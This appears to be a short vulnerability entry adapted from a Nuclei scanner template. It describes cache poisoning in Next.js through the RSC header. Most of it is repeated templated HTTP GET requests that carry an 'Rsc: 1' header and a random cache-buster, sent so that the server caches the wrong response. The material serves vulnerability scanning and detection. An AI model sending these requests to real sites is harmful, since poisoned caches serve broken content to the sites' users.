# Vulnerability: Next.js - Cache Poisoning
**Classification:** NEXTJS
**Source:** Nuclei Template (`nextjs-rsc-cache.yaml`)

## Description
Next.js is vulnerable to Cache Poisoning using RSC.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /?cb={{rand}} HTTP/1.1
Host: {{Hostname}}
Priority: u=1
Rsc: 1

@timeout: 10s
GET /?cb={{rand}} HTTP/1.1
Host: {{Hostname}}
Priority: u=1
Rsc: 1

@timeout: 10s
GET /?cb={{rand}} HTTP/1.1
Host: {{Hostname}}
```

